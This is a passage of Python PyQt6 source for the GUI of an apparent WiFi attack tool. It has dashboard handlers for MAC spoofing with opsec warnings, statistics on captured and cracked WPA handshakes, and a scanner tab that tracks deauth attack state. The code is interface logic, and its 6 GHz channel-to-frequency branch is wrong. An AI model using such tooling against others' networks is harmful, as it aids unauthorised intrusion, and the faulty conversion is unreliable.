                self.mac_spoofing_label.setStyleSheet("font-weight: bold; color: #00ff00; background-color: #002200; padding: 5px;")
            else:
                # RED FLASHING - MAC is NOT spoofed (bad for opsec)
                self.mac_flash_state = not self.mac_flash_state
                if self.mac_flash_state:
                    self.mac_spoofing_label.setText(f"⚠ MAC NOT SPOOFED! ⚠\n{current_mac}")
                    self.mac_spoofing_label.setStyleSheet("font-weight: bold; color: #ff0000; background-color: #220000; padding: 5px;")
                else:
                    self.mac_spoofing_label.setText(f"⚠ MAC NOT SPOOFED! ⚠\n{current_mac}")
                    self.mac_spoofing_label.setStyleSheet("font-weight: bold; color: #ffffff; background-color: #ff0000; padding: 5px;")

        except Exception as e:
            self.mac_spoofing_label.setText(f"MAC: Error checking")
            self.mac_spoofing_label.setStyleSheet("font-weight: bold; color: gray;")
            print(f"[ERROR] Failed to check MAC spoofing status: {e}")

    def update_monitor_status(self, interface: str):
        """Update monitor mode status"""
        self.monitor_interface_label.setText(f"Monitor Mode: ✓ {interface}")
        self.log(f"✓ Monitor mode enabled: {interface}")

    def update_scanner_status(self, status: str):
        """Update scanner status"""
        self.scanner_status_label.setText(status)
        if "Running" in status:
            self.scanner_progress.setValue(50)
        elif "Idle" in status:
            self.scanner_progress.setValue(0)
        else:
            self.scanner_progress.setValue(100)
        self.log(f"Scanner: {status}")

    def update_status(self, status: dict):
        """Update status display"""
        if 'error' not in status:
            # This can be called from status monitor with various info
            pass

    def on_networks_clicked(self):
        """Navigate to Scanner tab when Networks card is clicked"""
        if self.main_window:
            # Find and switch to Scanner tab (tab index 1)
            tab_widget = self.main_window.centralWidget()
            tab_widget.setCurrentIndex(1)

    def on_clients_clicked(self):
        """Navigate to Scanner tab when Clients card is clicked"""
        if self.main_window:
            # Find and switch to Scanner tab (tab index 1)
            tab_widget = self.main_window.centralWidget()
            tab_widget.setCurrentIndex(1)

    def on_handshakes_clicked(self):
        """Navigate to Database tab when Handshakes card is clicked"""
        if self.main_window:
            # Find and switch to Database tab
            tab_widget = self.main_window.centralWidget()
            for i in range(tab_widget.count()):
                if "Database" in tab_widget.tabText(i):
                    tab_widget.setCurrentIndex(i)
                    break

    def on_keys_clicked(self):
        """Navigate to Database tab and filter by cracked networks"""
        if self.main_window:
            # Find and switch to Database tab
            tab_widget = self.main_window.centralWidget()
            for i in range(tab_widget.count()):
                if "Database" in tab_widget.tabText(i):
                    tab_widget.setCurrentIndex(i)
                    # TODO: Apply cracked filter on database tab
                    break

    def on_serialized_clicked(self):
        """Show serialized items details popup - ALL entities with serials + random example"""
        from PyQt6.QtWidgets import QMessageBox
        from src.database.models import get_session, Network, Client, Handshake, ScanSession, WiGLEImport, OUIUpdate
        import random

        try:
            session = get_session()

            # Count all serialized entities across ALL tables
            networks = session.query(Network).count()
            clients = session.query(Client).count()
            handshakes = session.query(Handshake).count()
            scan_sessions = session.query(ScanSession).count()
            wigle_imports = session.query(WiGLEImport).count()
            oui_updates = session.query(OUIUpdate).count()

            total_serialized = networks + clients + handshakes + scan_sessions + wigle_imports + oui_updates

            # Pick a random serialized item to showcase
            example_text = ""
            if total_serialized > 0:
                # Build list of non-empty tables
                tables = []
                if networks > 0:
                    tables.append(('Network', Network, networks))
                if clients > 0:
                    tables.append(('Client', Client, clients))
                if handshakes > 0:
                    tables.append(('Handshake', Handshake, handshakes))
                if scan_sessions > 0:
                    tables.append(('Scan Session', ScanSession, scan_sessions))
                if wigle_imports > 0:
                    tables.append(('WiGLE Import', WiGLEImport, wigle_imports))
                if oui_updates > 0:
                    tables.append(('OUI Update', OUIUpdate, oui_updates))

                if tables:
                    # Pick random table
                    table_name, table_class, count = random.choice(tables)

                    # Pick random offset
                    offset = random.randint(0, count - 1)
                    random_item = session.query(table_class).offset(offset).first()

                    if random_item:
                        # Build description based on table type
                        if table_name == 'Network':
                            desc = f"{random_item.ssid or '(Hidden)'} [{random_item.bssid}]"
                        elif table_name == 'Client':
                            desc = f"{random_item.mac_address}"
                        elif table_name == 'Handshake':
                            desc = f"Network ID: {random_item.network_id}, Client: {random_item.client_mac or 'N/A'}"
                        elif table_name == 'Scan Session':
                            desc = f"Started: {random_item.start_time}"
                        elif table_name == 'WiGLE Import':
                            desc = f"Imported: {random_item.import_time}"
                        elif table_name == 'OUI Update':
                            desc = f"Updated: {random_item.update_time}"
                        else:
                            desc = "N/A"

                        example_text = f"""
━━━━━━━━━━━━━━━━
**📜 Random Serialized Item Example:**

Type: {table_name}
Serial: `{random_item.serial}`
Info: {desc}
━━━━━━━━━━━━━━━━
"""

            details = f"""**All Serialized Database Entities:**

📡 Networks (APs): {networks}
👥 Clients: {clients}
🤝 Handshakes: {handshakes}
📊 Scan Sessions: {scan_sessions}
🌍 WiGLE Imports: {wigle_imports}
🔄 OUI Updates: {oui_updates}

━━━━━━━━━━━━━━━━
**Total Entities: {total_serialized}**{example_text}

Every record in the database has a unique serial number for tracking and identification."""

            QMessageBox.information(
                self,
                "Serialized Database Statistics",
                details
            )
            session.close()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to load serial statistics: {e}")

    def on_encryption_clicked(self):
        """Navigate to Database tab with encryption filter"""
        print("[*] Dashboard: Encryption types clicked - navigating to Database tab")

        # Switch to Database tab
        if self.main_window and hasattr(self.main_window, 'tabs') and hasattr(self.main_window, 'database_tab'):
            tab_widget = self.main_window.tabs
            for i in range(tab_widget.count()):
                if tab_widget.widget(i) == self.main_window.database_tab:
                    tab_widget.setCurrentIndex(i)
                    # TODO: Set encryption filter on database tab
                    print("[✓] Switched to Database tab")
                    break

    def on_wps_clicked(self):
        """Navigate to WPS Networks tab"""
        print("[*] Dashboard: WPS stats clicked - navigating to WPS Networks tab")

        # Switch to WPS Networks tab
        if self.main_window and hasattr(self.main_window, 'tabs') and hasattr(self.main_window, 'wps_networks_tab'):
            tab_widget = self.main_window.tabs
            for i in range(tab_widget.count()):
                if tab_widget.widget(i) == self.main_window.wps_networks_tab:
                    tab_widget.setCurrentIndex(i)
                    print("[✓] Switched to WPS Networks tab")
                    break

    def on_spoof_mac_clicked(self):
        """Handle Acquire New MAC button click"""
        from PyQt6.QtWidgets import QMessageBox
        import requests

        try:
            # Get primary wireless interface (check both normal and monitor interfaces)
            interface = None
            for iface_name in ['wlp7s0mon', 'wlan0mon', 'wlan0', 'wlp7s0', 'wlp3s0', 'wlan1']:
                try:
                    with open(f'/sys/class/net/{iface_name}/address', 'r') as f:
                        interface = iface_name
                        if iface_name.endswith('mon'):
                            print(f"[*] Found monitor interface {iface_name} for MAC spoofing")
                        break
                except FileNotFoundError:
                    continue

            if not interface:
                QMessageBox.warning(
                    self,
                    "No WiFi Interface",
                    "Could not find a wireless interface."
                )
                return

            # Confirm action
            reply = QMessageBox.question(
                self,
                "Acquire New MAC Address",
                f"Acquire a new randomized MAC address on {interface}?\n\n"
                f"This will randomize your MAC address for privacy.\n"
                f"The interface will be brought down briefly during the change.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )

            if reply == QMessageBox.StandardButton.Yes:
                # Perform spoofing via API
                try:
                    response = requests.post(
                        'http://localhost:5555/api/v3/system/mac/spoof',
                        json={'interface': interface},
                        timeout=10
                    )
                    data = response.json()

                    if data.get('success'):
                        message = data.get('data', {}).get('message', 'MAC address spoofed successfully')
                        QMessageBox.information(
                            self,
                            "MAC Address Acquired",
                            f"✓ {message}\n\nInterface: {interface}"
                        )
                        # Refresh MAC status immediately
                        self.update_mac_spoofing_status()
                    else:
                        error_msg = data.get('error', {}).get('message', 'Unknown error')
                        QMessageBox.warning(
                            self,
                            "Failed",
                            f"Failed to acquire new MAC:\n{error_msg}"
                        )
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        "Connection Error",
                        "Could not connect to orchestrator API.\nPlease ensure the orchestrator service is running."
                    )
                except requests.exceptions.Timeout:
                    QMessageBox.warning(
                        self,
                        "Timeout",
                        "Request timed out. The operation may still be in progress."
                    )

        except Exception as e:
            QMessageBox.critical(
                self,
                "Error",
                f"Error acquiring new MAC address:\n{e}"
            )
            import traceback
            traceback.print_exc()

    def on_restore_mac_clicked(self):
        """Handle Restore MAC button click"""
        from PyQt6.QtWidgets import QMessageBox
        import requests

        try:
            # Get primary wireless interface
            interface = None
            for iface_name in ['wlan0', 'wlp7s0', 'wlp3s0', 'wlan1']:
                try:
                    with open(f'/sys/class/net/{iface_name}/address', 'r') as f:
                        interface = iface_name
                        break
                except FileNotFoundError:
                    continue

            if not interface:
                QMessageBox.warning(
                    self,
                    "No WiFi Interface",
                    "Could not find a wireless interface to restore."
                )
                return

            # Confirm action
            reply = QMessageBox.question(
                self,
                "Restore MAC Address",
                f"Restore permanent hardware MAC on {interface}?\n\n"
                f"This will restore the original factory MAC address.\n"
                f"The interface will be brought down briefly during the change.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )

            if reply == QMessageBox.StandardButton.Yes:
                # Perform restore via API
                try:
                    response = requests.post(
                        'http://localhost:5555/api/v3/system/mac/restore',
                        json={'interface': interface},
                        timeout=10
                    )
                    data = response.json()

                    if data.get('success'):
                        message = data.get('data', {}).get('message', 'MAC address restored successfully')
                        QMessageBox.information(
                            self,
                            "MAC Restored",
                            f"✓ {message}\n\nInterface: {interface}"
                        )
                        # Refresh MAC status immediately
                        self.update_mac_spoofing_status()
                    else:
                        error_msg = data.get('error', {}).get('message', 'Unknown error')
                        QMessageBox.warning(
                            self,
                            "Restore Failed",
                            f"Failed to restore MAC:\n{error_msg}"
                        )
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        "Connection Error",
                        "Could not connect to orchestrator API.\nPlease ensure the orchestrator service is running."
                    )
                except requests.exceptions.Timeout:
                    QMessageBox.warning(
                        self,
                        "Timeout",
                        "Request timed out. The operation may still be in progress."
                    )

        except Exception as e:
            QMessageBox.critical(
                self,
                "Error",
                f"Error restoring MAC address:\n{e}"
            )

    # ========== NEW INTERACTIVE CLICK HANDLERS ==========

    def on_today_clicked(self):
        """View today's discoveries"""
        QMessageBox.information(self, "Today's Data", "Filtering by today's discoveries...\n(Feature to be implemented)")

    def on_week_clicked(self):
        """View this week's discoveries"""
        QMessageBox.information(self, "This Week's Data", "Filtering by this week's discoveries...\n(Feature to be implemented)")

    def on_month_clicked(self):
        """View this month's discoveries"""
        QMessageBox.information(self, "This Month's Data", "Filtering by this month's discoveries...\n(Feature to be implemented)")

    def on_channels_clicked(self):
        """View networks by channel"""
        QMessageBox.information(self, "Channel Distribution", "View networks by WiFi channel...\n(Feature to be implemented)")

    def on_manufacturers_clicked(self):
        """View networks by manufacturer"""
        QMessageBox.information(self, "Manufacturers", "View networks by device manufacturer...\n(Feature to be implemented)")

    def on_signal_clicked(self):
        """View networks by signal strength"""
        QMessageBox.information(self, "Signal Strength", "View networks by signal strength range...\n(Feature to be implemented)")

    def on_hidden_clicked(self):
        """View hidden networks"""
        if self.main_window:
            # Switch to Database tab and filter by hidden SSIDs
            tab_widget = self.main_window.centralWidget()
            for i in range(tab_widget.count()):
                if "Database" in tab_widget.tabText(i):
                    tab_widget.setCurrentIndex(i)
                    QMessageBox.information(self, "Hidden Networks", "Switched to Database tab\n(Filter by hidden SSIDs)")
                    break

    def on_resources_clicked(self):
        """View detailed system resources"""
        import subprocess
        # Open system monitor
        try:
            subprocess.Popen(['gnome-system-monitor'])
        except:
            try:
                subprocess.Popen(['ksysguard'])
            except:
                QMessageBox.information(self, "System Monitor", f"CPU, RAM, Disk usage details\n(Open system monitor manually)")

    def on_attack_stats_clicked(self):
        """View attack statistics"""
        QMessageBox.information(self, "Attack Statistics", "View attack history and success rates...\n(Feature to be implemented)")

    def on_files_clicked(self):
        """Open captures folder"""
        import subprocess
        from pathlib import Path
        captures_path = Path.cwd() / "data" / "captures"
        try:
            subprocess.Popen(['xdg-open', str(captures_path)])
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not open captures folder:\n{e}")

    def on_scans_clicked(self):
        """View all scan sessions"""
        QMessageBox.information(self, "Scan Sessions", "View all historical scan sessions...\n(Feature to be implemented)")

    def on_top_ssids_clicked(self):
        """View networks by SSID"""
        QMessageBox.information(self, "Common SSIDs", "View networks grouped by SSID...\n(Feature to be implemented)")

    def load_os_info(self):
        """Load and display OS detection info"""
        try:
            import json
            from pathlib import Path

            os_info_file = Path.cwd() / "data" / "config" / "os_info.json"
            if os_info_file.exists():
                with open(os_info_file, 'r') as f:
                    os_info = json.load(f)

                distro_type = os_info.get('distribution_type', 'unknown')
                pretty_name = os_info.get('PRETTY_NAME', 'Unknown OS')
                kernel = os_info.get('kernel', 'unknown')

                # Color code by distro
                if distro_type == 'kali':
                    color = "#00aaff"  # Blue for Kali
                elif distro_type == 'ubuntu':
                    color = "#ff6600"  # Orange for Ubuntu
                elif distro_type == 'debian':
                    color = "#ff0088"  # Pink for Debian
                else:
                    color = "#00ff88"  # Green for other

                self.os_info_label.setText(f"OS: {pretty_name} | Kernel: {kernel}")
                self.os_info_label.setStyleSheet(f"font-size: 11px; color: {color}; font-weight: bold;")
            else:
                self.os_info_label.setText("OS: Not detected yet")
                self.os_info_label.setStyleSheet("font-size: 11px; color: #666; font-weight: bold;")
        except Exception as e:
            self.os_info_label.setText(f"OS: Error ({e})")
            self.os_info_label.setStyleSheet("font-size: 11px; color: #ff0000; font-weight: bold;")

    def refresh_extended_stats(self):
        """Refresh all the new extended statistics"""
        try:
            from src.database.models import get_session, Network, Client, Handshake, ScanSession
            from sqlalchemy import func
            from datetime import datetime, timedelta
            from pathlib import Path
            import psutil

            session = get_session()

            # ========== TIME-BASED STATISTICS ==========
            now = datetime.now()
            today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
            week_start = now - timedelta(days=now.weekday())
            month_start = now.replace(day=1, hour=0, minute=0, second=0, microsecond=0)

            # Today's stats
            today_networks = session.query(Network).filter(Network.first_seen >= today_start).count()
            today_clients = session.query(Client).filter(Client.first_seen >= today_start).count()
            today_handshakes = session.query(Handshake).filter(Handshake.captured_at >= today_start).count()
            today_cracked = session.query(Handshake).filter(
                Handshake.captured_at >= today_start,
                Handshake.is_cracked == True
            ).count()

            self.today_networks_label.setText(f"Networks: {today_networks}")
            self.today_clients_label.setText(f"Clients: {today_clients}")
            self.today_handshakes_label.setText(f"Handshakes: {today_handshakes}")
            self.today_cracked_label.setText(f"Cracked: {today_cracked}")

            # Week's stats
            week_networks = session.query(Network).filter(Network.first_seen >= week_start).count()
            week_clients = session.query(Client).filter(Client.first_seen >= week_start).count()
            week_handshakes = session.query(Handshake).filter(Handshake.captured_at >= week_start).count()
            week_cracked = session.query(Handshake).filter(
                Handshake.captured_at >= week_start,
                Handshake.is_cracked == True
            ).count()

            self.week_networks_label.setText(f"Networks: {week_networks}")
            self.week_clients_label.setText(f"Clients: {week_clients}")
            self.week_handshakes_label.setText(f"Handshakes: {week_handshakes}")
            self.week_cracked_label.setText(f"Cracked: {week_cracked}")

            # Month's stats
            month_networks = session.query(Network).filter(Network.first_seen >= month_start).count()
            month_clients = session.query(Client).filter(Client.first_seen >= month_start).count()
            month_handshakes = session.query(Handshake).filter(Handshake.captured_at >= month_start).count()
            month_cracked = session.query(Handshake).filter(
                Handshake.captured_at >= month_start,
                Handshake.is_cracked == True
            ).count()

            self.month_networks_label.setText(f"Networks: {month_networks}")
            self.month_clients_label.setText(f"Clients: {month_clients}")
            self.month_handshakes_label.setText(f"Handshakes: {month_handshakes}")
            self.month_cracked_label.setText(f"Cracked: {month_cracked}")

            # All-time stats
            total_networks = session.query(Network).count()
            total_clients = session.query(Client).count()
            total_handshakes = session.query(Handshake).count()
            total_cracked = session.query(Handshake).filter(Handshake.is_cracked == True).count()

            self.alltime_networks_label.setText(f"Networks: {total_networks}")
            self.alltime_clients_label.setText(f"Clients: {total_clients}")
            self.alltime_handshakes_label.setText(f"Handshakes: {total_handshakes}")
            self.alltime_cracked_label.setText(f"Cracked: {total_cracked}")

            # ========== CHANNEL DISTRIBUTION ==========
            channel_counts = session.query(Network.channel, func.count(Network.id)).filter(
                Network.channel.isnot(None)
            ).group_by(Network.channel).all()

            # Calculate max count for relative bars
            max_count = max([count for _, count in channel_counts], default=1)

            for ch in self.channel_labels:
                self.channel_labels[ch].setText(f"Ch {ch}: 0")
                self.channel_labels[ch].setStyleSheet("font-size: 9px;")

            for channel, count in channel_counts:
                if channel and channel in self.channel_labels:
                    # Calculate relative bar width (0-10 blocks)
                    if max_count > 0:
                        bar_width = int((count / max_count) * 10)
                    else:
                        bar_width = 0

                    # Create visual bar with color based on congestion
                    if bar_width >= 8:
                        color = "#ff0044"  # Red - very congested
                        bar_char = "█"
                    elif bar_width >= 5:
                        color = "#ff6600"  # Orange - congested
                        bar_char = "▆"
                    elif bar_width >= 3:
                        color = "#ffaa00"  # Yellow - moderate
                        bar_char = "▄"
                    else:
                        color = "#00ff88"  # Green - clear
                        bar_char = "▂"

                    bars = bar_char * bar_width

                    # Update label with count and bar
                    self.channel_labels[channel].setText(f"Ch {channel}: {count} {bars}")
                    self.channel_labels[channel].setStyleSheet(f"font-size: 9px; color: {color};")

            # ========== TOP MANUFACTURERS ==========
            mfr_counts = session.query(Network.manufacturer, func.count(Network.id)).filter(
                Network.manufacturer.isnot(None),
                Network.manufacturer != ''
            ).group_by(Network.manufacturer).order_by(func.count(Network.id).desc()).limit(10).all()

            for i in range(10):
                if i < len(mfr_counts):
                    mfr, count = mfr_counts[i]
                    self.top_mfr_labels[i].setText(f"{i+1}. {mfr}: {count}")
                else:
                    self.top_mfr_labels[i].setText(f"{i+1}. -")

            # ========== SIGNAL STRENGTH ==========
            excellent = session.query(Network).filter(Network.current_signal > -50).count()
            good = session.query(Network).filter(Network.current_signal <= -50, Network.current_signal > -60).count()
            fair = session.query(Network).filter(Network.current_signal <= -60, Network.current_signal > -70).count()
            weak = session.query(Network).filter(Network.current_signal <= -70, Network.current_signal > -80).count()
            poor = session.query(Network).filter(Network.current_signal <= -80).count()

            self.signal_excellent_label.setText(f"Excellent (> -50dBm): {excellent}")
            self.signal_good_label.setText(f"Good (-50 to -60dBm): {good}")
            self.signal_fair_label.setText(f"Fair (-60 to -70dBm): {fair}")
            self.signal_weak_label.setText(f"Weak (-70 to -80dBm): {weak}")
            self.signal_poor_label.setText(f"Poor (< -80dBm): {poor}")

            # Average signal
            avg_signal = session.query(func.avg(Network.current_signal)).filter(
                Network.current_signal.isnot(None)
            ).scalar()
            if avg_signal:
                self.signal_avg_label.setText(f"Average: {avg_signal:.1f} dBm")

            # ========== HIDDEN NETWORKS ==========
            visible = session.query(Network).filter(Network.ssid.isnot(None), Network.ssid != '').count()
            hidden = session.query(Network).filter((Network.ssid == '') | (Network.ssid.is_(None))).count()
            total = visible + hidden
            hidden_pct = (hidden / total * 100) if total > 0 else 0

            self.visible_networks_label.setText(f"Visible SSIDs: {visible}")
            self.hidden_networks_label.setText(f"Hidden SSIDs: {hidden}")
            self.hidden_percentage_label.setText(f"{hidden_pct:.1f}% hidden")

            # ========== SYSTEM RESOURCES ==========
            try:
                cpu_percent = psutil.cpu_percent(interval=0.1)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                boot_time = psutil.boot_time()
                uptime_seconds = now.timestamp() - boot_time
                uptime_hours = int(uptime_seconds // 3600)
                uptime_mins = int((uptime_seconds % 3600) // 60)

                self.cpu_usage_label.setText(f"CPU: {cpu_percent:.1f}%")
                self.ram_usage_label.setText(f"RAM: {mem.percent:.1f}% ({mem.used / (1024**3):.1f}GB / {mem.total / (1024**3):.1f}GB)")
                self.disk_usage_label.setText(f"Disk: {disk.percent:.1f}% ({disk.used / (1024**3):.1f}GB / {disk.total / (1024**3):.1f}GB)")
                self.system_uptime_label.setText(f"Uptime: {uptime_hours}h {uptime_mins}m")
            except:
                pass

            # ========== FILE STATISTICS ==========
            captures_dir = Path.cwd() / "data" / "captures"
            handshake_dir = captures_dir / "handshakes"
            service_dir = captures_dir / "service"

            handshake_files = list(handshake_dir.glob("*.cap")) if handshake_dir.exists() else []
            service_files = list(service_dir.glob("*.csv")) if service_dir.exists() else []

            total_size = sum(f.stat().st_size for f in handshake_files + service_files) / (1024 * 1024)

            self.handshake_files_label.setText(f"Handshake files: {len(handshake_files)}")
            self.service_files_label.setText(f"Service files: {len(service_files)}")
            self.total_capture_size_label.setText(f"Total size: {total_size:.2f} MB")

            if handshake_files or service_files:
                all_files = handshake_files + service_files
                oldest = min(all_files, key=lambda f: f.stat().st_mtime)
                newest = max(all_files, key=lambda f: f.stat().st_mtime)

                oldest_time = datetime.fromtimestamp(oldest.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
                newest_time = datetime.fromtimestamp(newest.stat().st_mtime).strftime("%Y-%m-%d %H:%M")

                self.oldest_capture_label.setText(f"Oldest: {oldest_time}")
                self.newest_capture_label.setText(f"Newest: {newest_time}")

            # ========== RECENT SCANS ==========
            recent_scans = session.query(ScanSession).order_by(ScanSession.start_time.desc()).limit(5).all()
            self.recent_scans_list.clear()
            for scan in recent_scans:
                start = scan.start_time.strftime("%Y-%m-%d %H:%M") if scan.start_time else "N/A"
                end = scan.end_time.strftime("%H:%M") if scan.end_time else "ongoing"
                self.recent_scans_list.append(f"{scan.serial} | {start} - {end} | {scan.status}")

            # ========== TOP SSIDs ==========
            ssid_counts = session.query(Network.ssid, func.count(Network.id)).filter(
                Network.ssid.isnot(None),
                Network.ssid != ''
            ).group_by(Network.ssid).order_by(func.count(Network.id).desc()).limit(10).all()

            for i in range(10):
                if i < len(ssid_counts):
                    ssid, count = ssid_counts[i]
                    self.top_ssid_labels[i].setText(f"{i+1}. {ssid}: {count} APs")
                else:
                    self.top_ssid_labels[i].setText(f"{i+1}. -")

            # SSID statistics
            unique_ssids = session.query(func.count(func.distinct(Network.ssid))).filter(
                Network.ssid.isnot(None),
                Network.ssid != ''
            ).scalar()

            duplicate_ssids = session.query(Network.ssid, func.count(Network.id)).filter(
                Network.ssid.isnot(None),
                Network.ssid != ''
            ).group_by(Network.ssid).having(func.count(Network.id) > 1).count()

            total_aps = session.query(Network).filter(
                Network.ssid.isnot(None),
                Network.ssid != ''
            ).count()

            avg_aps = (total_aps / unique_ssids) if unique_ssids > 0 else 0

            self.unique_ssids_label.setText(f"Unique SSIDs: {unique_ssids}")
            self.duplicate_ssids_label.setText(f"Duplicate SSIDs: {duplicate_ssids}")
            self.total_ssids_label.setText(f"Total: {total_aps}")
            self.avg_aps_per_ssid_label.setText(f"Avg APs/SSID: {avg_aps:.1f}")

            session.close()

        except Exception as e:
            print(f"[ERROR] Failed to refresh extended statistics: {e}")
            import traceback
            traceback.print_exc()


class ScannerTab(QWidget):
    """Real-time WiFi network scanning tab"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.main_window = None  # Will be set by MainWindow.set_main_window()
        self.scanner = None
        self.monitor_interface = None
        self.ap_tree_items = {}  # BSSID -> QTreeWidgetItem
        self.client_tree_items = {}  # MAC -> QTreeWidgetItem
        self.unassociated_clients_group = None  # Group item for unassociated clients

        # Animation state for scanning indicator
        self.scan_animation_timer = None
        self.scan_animation_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.scan_animation_index = 0

        # Continuous deauth attack state
        self.deauth_running = False

        # Signal bar color shift animation
        self.signal_color_shift_timer = None
        self.signal_color_phase = 0  # 0-359 for color cycling

        # Database polling for current scan data
        self.db_poll_timer = None
        self.last_ap_count = 0
        self.last_client_count = 0

        # Event manager for real-time updates
        self.event_manager = None
        self._setup_event_manager()

        self.init_ui()

    def _setup_event_manager(self):
        """Setup event manager for real-time updates"""
        try:
            from ..services.event_manager import get_event_manager
            self.event_manager = get_event_manager()

            # Connect signals for real-time updates
            if hasattr(self.event_manager, 'network_added'):
                self.event_manager.network_added.connect(self._on_network_added)
                self.event_manager.network_updated.connect(self._on_network_updated)
                self.event_manager.client_added.connect(self._on_client_added)
                self.event_manager.client_updated.connect(self._on_client_updated)
                print("[ScannerTab] ✓ Connected to event manager for real-time updates")
        except Exception as e:
            print(f"[ScannerTab] Warning: Could not setup event manager: {e}")

    def _on_network_added(self, network_dict):
        """Handle new network discovered - add to tree instantly"""
        try:
            bssid = network_dict.get('bssid', '').upper()
            if not bssid or bssid in self.ap_tree_items:
                return  # Already exists or invalid

            # Create tree item for this network
            item = QTreeWidgetItem()

            # Set columns (matching existing structure)
            ssid = network_dict.get('ssid') or '(hidden)'
            item.setText(0, ssid)
            item.setText(1, bssid)
            item.setText(2, str(network_dict.get('channel', '')))
            item.setText(3, network_dict.get('encryption', ''))

            # Signal strength with color
            power = network_dict.get('power')
            if power is not None:
                bar, color, _ = self.get_signal_bar(f"{power} dBm", use_animation=False)
                item.setText(4, bar)
                item.setForeground(4, QBrush(QColor(color)))

            item.setText(5, str(network_dict.get('beacon_count', '')))
            item.setText(6, str(network_dict.get('wps_enabled', False)))

            # Add to tree
            self.ap_tree.addTopLevelItem(item)
            self.ap_tree_items[bssid] = item

            # Update counter
            self.ap_count_label.setText(f"APs: {len(self.ap_tree_items)}")

            print(f"[RT-UPDATE] ✓ Added network: {ssid} ({bssid})")

        except Exception as e:
            print(f"[!] Error adding network to tree: {e}")
            import traceback
            traceback.print_exc()

    def _on_network_updated(self, network_dict):
        """Handle network update - update existing tree item"""
        try:
            bssid = network_dict.get('bssid', '').upper()
            if not bssid or bssid not in self.ap_tree_items:
                # Not in tree yet, add it
                self._on_network_added(network_dict)
                return

            item = self.ap_tree_items[bssid]

            # Update changed fields
            ssid = network_dict.get('ssid') or '(hidden)'
            item.setText(0, ssid)

            # Update signal strength
            power = network_dict.get('power')
            if power is not None:
                bar, color, _ = self.get_signal_bar(f"{power} dBm", use_animation=False)
                item.setText(4, bar)
                item.setForeground(4, QBrush(QColor(color)))

            # Update beacon count
            item.setText(5, str(network_dict.get('beacon_count', '')))

        except Exception as e:
            print(f"[!] Error updating network in tree: {e}")

    def _on_client_added(self, client_dict):
        """Handle new client discovered"""
        try:
            mac = client_dict.get('mac_address', '').upper()
            if not mac or mac in self.client_tree_items:
                return

            bssid = client_dict.get('bssid', '').upper()

            # Create client item
            item = QTreeWidgetItem()
            item.setText(0, mac)

            # Signal strength
            power = client_dict.get('power')
            if power is not None:
                bar, color, _ = self.get_signal_bar(f"{power} dBm", use_animation=False)
                item.setText(1, bar)
                item.setForeground(1, QBrush(QColor(color)))

            item.setText(2, str(client_dict.get('packets', '')))

            # Add to appropriate parent
            if bssid and bssid in self.ap_tree_items:
                # Associated client - add under network
                parent_item = self.ap_tree_items[bssid]
                parent_item.addChild(item)
            else:
                # Unassociated - add to unassociated group
                if not self.unassociated_clients_group:
                    self.unassociated_clients_group = QTreeWidgetItem()
                    self.unassociated_clients_group.setText(0, "Unassociated Clients")
                    self.ap_tree.addTopLevelItem(self.unassociated_clients_group)
                self.unassociated_clients_group.addChild(item)

            self.client_tree_items[mac] = item

            # Update counter
            client_count = len(self.client_tree_items)
            self.client_count_label.setText(f"Clients: {client_count}")

            print(f"[RT-UPDATE] ✓ Added client: {mac}")

        except Exception as e:
            print(f"[!] Error adding client to tree: {e}")

    def _on_client_updated(self, client_dict):
        """Handle client update"""
        try:
            mac = client_dict.get('mac_address', '').upper()
            if not mac or mac not in self.client_tree_items:
                self._on_client_added(client_dict)
                return

            item = self.client_tree_items[mac]

            # Update signal strength
            power = client_dict.get('power')
            if power is not None:
                bar, color, _ = self.get_signal_bar(f"{power} dBm", use_animation=False)
                item.setText(1, bar)
                item.setForeground(1, QBrush(QColor(color)))

            # Update packet count
            item.setText(2, str(client_dict.get('packets', '')))

        except Exception as e:
            print(f"[!] Error updating client in tree: {e}")

    @staticmethod
    def channel_to_frequency(channel_str: str) -> str:
        """
        Convert WiFi channel to frequency

        Args:
            channel_str: Channel number as string

        Returns:
            Formatted string with channel and frequency (e.g., "6 (2437 MHz)")
        """
        try:
            channel = int(channel_str.strip())

            # 2.4 GHz band (channels 1-14)
            if 1 <= channel <= 14:
                freq_mhz = 2407 + (channel * 5)
                return f"{channel} ({freq_mhz} MHz)"

            # 5 GHz band (channels 36-165)
            elif 36 <= channel <= 165:
                freq_mhz = 5000 + (channel * 5)
                return f"{channel} ({freq_mhz} MHz)"

            # 6 GHz band (channels 1-233)
            elif 233 < channel <= 255:
                freq_mhz = 5955 + (channel * 5)
                return f"{channel} ({freq_mhz} MHz)"

            else:
                return str(channel)

        except (ValueError, AttributeError):
            return str(channel_str)

    def get_signal_bar(self, power_str: str, use_animation: bool = True) -> tuple:
        """
        Create a colored signal strength bar based on dBm value
        Uses 24-bit RGB colors for cyberpunk theme with visual pips and color shifting

        Signal ranges:
        -30 to -50 dBm: Excellent (bright cyan/green) - 5 bars
        -50 to -60 dBm: Good (green) - 4 bars
        -60 to -70 dBm: Fair (yellow/orange) - 3 bars
        -70 to -80 dBm: Poor (orange) - 2 bars
        -80 to -100 dBm: Very poor (red) - 1 bar

        Returns (bar_display_string, color_hex_string, power_value)
        """
        try:
            # Extract numeric value from power string (e.g., "-67 dBm" -> -67)
            if not power_str or power_str == "N/A" or power_str.strip() == "":
                return ("▂▁▁▁▁", "#666666", "??")

            # Parse the dBm value
            power_value = int(power_str.strip().split()[0])

            # Determine base signal quality and color using progressive bar heights
            # Colors match phone signal bar style: cyan/blue for strong, yellow for medium, red for weak
            if power_value >= -50:
                # Excellent signal - 5 bars ascending - bright blue/cyan
                base_color = (0, 191, 255)  # Deep Sky Blue (like phone signal bars)
                bars = "▂▃▅▆█"
            elif power_value >= -60:
                # Good signal - 4 bars - blue/cyan
                base_color = (0, 150, 255)  # Medium blue
                bars = "▂▃▅▆▁"
